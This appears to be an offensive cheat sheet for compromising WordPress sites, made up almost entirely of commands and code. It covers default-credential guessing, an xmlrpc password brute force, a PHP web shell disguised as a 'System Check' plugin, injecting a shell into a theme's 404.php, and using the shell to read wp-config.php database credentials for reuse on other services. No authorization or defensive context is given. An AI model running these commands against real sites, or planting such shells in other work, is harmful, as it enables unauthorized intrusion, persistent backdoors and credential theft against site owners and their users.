# WordPress Complete Exploitation

## Detection
```bash
# Identify WordPress
curl -s http://TARGET | grep wp-content
curl http://TARGET/wp-login.php

# Scan for vulnerabilities
wpscan --url http://TARGET --enumerate vp,vt,u --api-token YOUR_TOKEN
```

## Getting Admin Access

### Method 1: Default Credentials
```
Try these first:
admin:admin
admin:password
administrator:administrator
```

### Method 2: xmlrpc.php Brute Force
```bash
# xmlrpc allows multiple password attempts per request
wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

### Method 3: Plugin Vulnerabilities
```bash
# Find vulnerable plugins
wpscan --url http://TARGET --enumerate vp

# Search for exploits
searchsploit wordpress PLUGIN_NAME
```

## Post-Authentication RCE

### Plugin Upload Method
```bash
# 1. Create malicious plugin
cat > shell.php << 'EOF'
<?php
/**
 * Plugin Name: System Check
 */
if(isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
EOF

# 2. Zip it
zip shell.zip shell.php

# 3. Upload via WordPress admin
# Plugins → Add New → Upload → Install → Activate

# 4. Execute commands
curl "http://TARGET/wp-content/plugins/shell/shell.php?cmd=id"
```

### Theme Editor Method
```bash
# Navigate to: Appearance → Theme Editor
# Edit 404.php
# Add at top: <?php system($_GET['cmd']); ?>
# Update File

# Execute
curl "http://TARGET/wp-content/themes/THEME_NAME/404.php?cmd=id"
```

## Database Credential Extraction

```bash
# Get RCE first, then:
curl "http://TARGET/shell.php?cmd=cat /var/www/html/wp-config.php"

# Reveals:
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wpuser');
# define('DB_PASSWORD', 'SuperSecretPass!');

# Connect to MySQL
mysql -h localhost -u wpuser -p'SuperSecretPass!'

# Or test password on other services!
```